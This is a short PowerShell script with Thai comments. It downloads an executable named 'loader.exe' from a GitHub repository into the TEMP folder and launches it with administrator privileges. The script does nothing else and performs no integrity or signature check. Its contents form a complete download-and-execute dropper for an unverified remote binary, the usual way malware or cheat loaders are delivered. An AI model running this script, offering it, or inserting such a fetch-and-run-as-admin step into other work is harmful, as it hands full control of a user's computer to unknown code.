# 1. ตั้งค่าตำแหน่งดาวน์โหลด (เก็บไว้ในโฟลเดอร์ Temp ของเครื่อง)
$exeUrl = "https://github.com/Reflexeiei885/ranvyx/raw/main/loader.exe"
$outputPath = "$env:TEMP\loader.exe"

# 2. เริ่มการดาวน์โหลด
Write-Host "Connecting to Server..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop
} catch {
    Write-Host "ดาวน์โหลดไม่สำเร็จ! กรุณาเช็คอินเทอร์เน็ตหรือลิงก์ไฟล์" -ForegroundColor Red
    pause
    exit
}

# 3. รันไฟล์ EXE และเด้งเข้าหน้า CMD (ในฐานะ Admin)
if (Test-Path $outputPath) {
    Write-Host "Starting Loader..." -ForegroundColor Green
    Start-Process -FilePath $outputPath -Verb RunAs
} else {
    Write-Host "ไม่พบไฟล์ในเครื่อง!" -ForegroundColor Red
    pause
}
